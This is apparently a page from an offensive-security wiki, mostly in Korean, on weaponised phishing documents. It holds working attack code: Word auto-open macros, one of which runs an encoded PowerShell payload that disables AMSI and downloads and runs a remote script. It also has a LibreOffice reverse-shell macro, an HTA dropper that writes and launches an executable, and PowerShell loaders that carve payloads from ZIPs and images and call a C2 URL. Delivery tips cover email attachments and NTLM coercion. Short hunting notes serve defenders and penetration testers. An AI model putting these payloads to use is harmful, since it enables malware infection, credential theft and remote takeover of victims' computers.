# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성 검사를 수행합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 따라 데이터 구조 식별의 형태로 수행됩니다. 데이터 구조 식별 과정에서 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 macros를 포함한 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경해 파일 이름을 바꾸어도 macros 실행 기능을 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 macros를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾸면 Microsoft Word가 이를 처리하고 macros를 실행할 수 있게 됩니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite (Excel, PowerPoint etc.)의 모든 소프트웨어에 적용됩니다.

다음 명령어로 일부 Office 프로그램이 실행할 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 외부 이미지 로드

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**카테고리**: 링크 및 참조, **필드 이름**: includePicture, 및 **파일 이름 또는 URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### 매크로 백도어

문서에서 매크로를 사용해 임의의 코드를 실행할 수 있습니다.

#### 자동 로드 함수

더 흔할수록 AV가 탐지할 가능성이 커집니다.

- AutoOpen()
- Document_Open()

#### 매크로 코드 예제
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭하세요.

#### Doc 확장자

완료되면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경하세요.\\  
이렇게 하는 이유는 **`.docx`** 안에는 macro's를 저장할 수 없고, macro-enabled **`.docm`** 확장자에는 **오명**이 있기 때문입니다(예: 썸네일 아이콘에 큰 `!`가 표시되고 일부 웹/이메일 게이트웨이는 이를 완전히 차단함). 따라서 이 **레거시 `.doc` 확장자가 최선의 절충안입니다**.

#### 악성 Macros 생성기

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 macros (Basic)

LibreOffice Writer 문서는 Basic macros를 포함할 수 있으며, 파일이 열릴 때 macro를 **Open Document** 이벤트에 바인딩하여 자동 실행할 수 있습니다 (Tools → Customize → Events → Open Document → Macro…). 간단한 reverse shell macro 예시는 다음과 같습니다:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
문자열 안의 겹따옴표(`""`)에 주의하세요 — LibreOffice Basic은 리터럴 따옴표를 이스케이프하기 위해 이를 사용하므로, `...==""")`로 끝나는 페이로드는 내부 명령과 Shell argument 둘 다 균형을 유지합니다.

Delivery tips:

- 파일을 `.odt`로 저장하고 macro를 문서 이벤트에 바인딩하여 문서를 열었을 때 즉시 실행되도록 하세요.
- `swaks`로 이메일을 보낼 때 `--attach @resume.odt`를 사용하세요 (`@`는 첨부파일로 파일 바이트가 전송되고 파일명 문자열이 아니라는 것을 보장하기 위해 필요합니다). 이는 검증 없이 임의의 `RCPT TO` 수신자를 허용하는 SMTP 서버를 악용할 때 특히 중요합니다.

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

HTA는 **`mshta.exe`**를 사용해 실행되며, 이는 일반적으로 **설치되어** **Internet Explorer**와 함께 제공되어 **`mshta` dependant on IE**가 됩니다. 따라서 Internet Explorer가 제거된 경우 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제하기

여러 가지 방법으로 **NTLM 인증을 "원격으로" 강제**할 수 있습니다. 예를 들어 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(심지어 HTTP MitM?). 또는 피해자에게 **폴더를 여는 것만으로** **인증을 유발하는** **파일의 주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 아이디어와 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash나 인증을 훔치는 것뿐만 아니라 **NTLM relay attacks**도 수행할 수 있다는 점을 잊지 마세요:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 캠페인은 두 개의 합법적인 미끼 문서(PDF/DOCX)와 악성 .lnk를 포함한 ZIP을 배포합니다. 핵심은 실제 PowerShell loader가 고유한 마커 뒤의 ZIP 원시 바이트에 저장되어 있고, .lnk가 이를 추출해 완전히 메모리에서 실행한다는 점입니다.

Typical flow implemented by the .lnk PowerShell one-liner:

1) 일반적인 경로에서 원본 ZIP을 찾습니다: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 및 현재 작업 디렉토리의 상위 폴더.  
2) ZIP 바이트를 읽어 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 뒤의 모든 데이터가 임베디드된 PowerShell 페이로드입니다.  
3) ZIP을 %ProgramData%로 복사하고 그곳에서 압축을 풀며, 합법적으로 보이도록 미끼 .docx를 엽니다.  
4) 현재 프로세스에서 AMSI를 우회: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 다음 단계의 난독화를 해제(예: 모든 # 문자 제거)하고 메모리에서 실행합니다.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 끝에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- .lnk — 상위/사용자 폴더를 열거하여 ZIP을 찾아 미끼 문서를 여는 형태.
- AMSI 변조 — [System.Management.Automation.AmsiUtils]::amsiInitFailed 사용.
- 신뢰된 PaaS 도메인에 호스팅된 링크로 끝나는 장시간 실행되는 비즈니스 스레드.

## Steganography-delimited payloads in images (PowerShell stager)

최근 loader chains는 난독화된 JavaScript/VBS를 전달하여 Base64 PowerShell stager를 디코드하고 실행한다. 해당 stager는 종종 GIF인 이미지를 다운로드하는데, 그 이미지에는 고유한 시작/종료 마커 사이에 평문으로 숨겨진 Base64 인코딩된 .NET DLL이 포함되어 있다. 스크립트는 이러한 구분자(현장에서 관찰된 예: «<<sudo_png>> … <<sudo_odt>>>»)를 검색하여 사이의 텍스트를 추출하고, Base64 디코딩하여 바이트로 변환한 다음 어셈블리를 메모리에서 로드하고 알려진 진입 메서드를 C2 URL과 함께 호출한다.

Workflow
- Stage 1: Archived JS/VBS dropper → 내장된 Base64 디코드 → -nop -w hidden -ep bypass 옵션으로 PowerShell stager 실행.
- Stage 2: PowerShell stager → 이미지 다운로드, 마커로 구분된 Base64 추출 → .NET DLL을 메모리에서 로드하고 (예: VAI) 메서드를 호출하며 C2 URL 및 옵션 전달.
- Stage 3: Loader가 최종 페이로드를 가져와 일반적으로 process hollowing을 통해 신뢰된 바이너리(주로 MSBuild.exe)에 인젝션. process hollowing 및 trusted utility proxy execution에 대한 자세한 내용은 여기 참조:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

참고
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다. 마커는 캠페인마다 다릅니다.
- AMSI/ETW bypass와 string deobfuscation은 일반적으로 assembly를 로드하기 전에 적용됩니다.
- Hunting: 알려진 구분자를 찾기 위해 다운로드된 이미지를 스캔하십시오; 이미지를 액세스하고 즉시 Base64 blobs를 디코딩하는 PowerShell을 식별하십시오.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- 자신의 파일 내용 읽기
- 잡다한 문자열 사이의 Base64 blob 찾기
- ASCII PowerShell로 디코딩
- `wscript.exe`/`cscript.exe`로 `powershell.exe`를 호출하여 실행

Hunting cues
- 아카이브된 JS/VBS 첨부파일이 커맨드라인에 `-enc`/`FromBase64String`을 포함하여 `powershell.exe`를 생성하는 경우.
- 사용자 temp 경로에서 `wscript.exe`가 `powershell.exe -nop -w hidden`을 실행하는 경우.

## Windows files to steal NTLM hashes

다음 페이지를 확인하세요: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
